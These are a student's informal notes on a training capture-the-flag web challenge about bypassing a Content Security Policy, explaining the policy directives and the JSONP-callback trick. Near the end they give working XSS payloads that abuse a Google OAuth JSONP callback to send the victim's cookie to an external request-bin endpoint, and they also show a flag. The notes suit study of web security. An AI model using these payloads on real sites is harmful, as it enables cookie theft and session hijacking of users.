//useful links
string babycsp = "https://babycsp.training.ctf.necst.it";
string csp = "https://csp.training.ctf.necst.it"

string request_bin = "https://requestbin.training.ctf.necst.it"
string checker = "https://checker.training.ctf.necst.it/checker.php"
//Goal : read the checker's cookie , which is NOT HTTPOnly
//Do XSS, you are attacking a user, namely a bot running on a browser (firefox)
//Here you need to steal the admin's cookie , which is ALWAYS visiting the page
//in csp and strict you have to steal from the checker

// How do you get data out when doing XSS ? You do HTTPS requests to a server you own
// you do from the site a GET(data you want) to evil.com(yours)

 //there's also another requestbin I think
 string web_bin = "requestbin.com"
 string your_endpoint = "https://ennwzvkmkf3a21o.m.pipedream.net"
// so the idea is :
// I do a http on my endpoint with the data that you need
// as you can see from
default-src 'self'; script-src 'self' *.google.com; connect-src *
// this can also be found in the header of a request
// Under Response Headers -> Content-Security Policy

default-src 'self'; //defines the default policy for FETCHING resources such as JS, Images, CSS. etc
script-src 'self' *.google.com ;//defines valid sources for javascript
connect-src * ; //applies to XMLHttpRequest(AJAX), WebSocket, fetch(), <a ping> or EventSource.
                // if not allowed the browser emulates a 400 HTTP status code

/*you can take a look at the post and you can see that a <script>alert(1);</script> is put into the page

  But the program refuses to execute it, as such we must look at the console in order to look which error
  is going on !
*/
Refused to execute inline script because it violates the following Content Security Policy directive:
"script-src 'self' *.google.com".
 Either the 'unsafe-inline' keyword, a hash ('sha256-82cOulk9q6+RBPUsHxBcmJ2gzbbmxmBIjdKzTVMOYXA='),
  or a nonce ('nonce-...') is required to enable inline execution.

  //Let's take a look, script-src is disabling us from doing anything, but.. google.com is allowed ,
  //can we take advantage from that ??
// The prof says to take a look at JSON and Whitelist = bypass
/*given*/ string CSP = "script-src 'self' https://whitelistedwebsite.com; object-src : 'none'""
//If whitelistedwebsite.com contains a JSONP (JSON with Padding) endpoint, we could do a bypass with

<script src="https://whitelistedwebsite.com/jsonp?callback=alert">
<script src="https://whitelistedwebsite.com/jsonp?callback="alert(1);nastyFunction();">

//HTTP req to request bin and access the cookie with document.cookies
// when  the page is ready you do report to admin

><script src="https://accounts.google.com/o/oauth2/revoke?callback=window.location.href%3D%27https%3A%2F%2Fennwzvkmkf3a21o.m.pipedream.net%3Fa%3D%27%2Bdocument.cookie%3B;"></script>

//so with this I just visit the website, can I do something to let him just do a GET ?

><script src="https://accounts.google.com/o/oauth2/revoke?callback=fetch%28%27https%3A%2F%2Fennwzvkmkf3a21o.m.pipedream.net%3Fa%3D%27%2Bdocument.cookie%29%3B;"></script>

//for some reason we cannot do a fetch , I'm not even sure that the escaping was really that necessary

flag :: flag{4re_yo0_s0_sure_csp_1s_useful?}
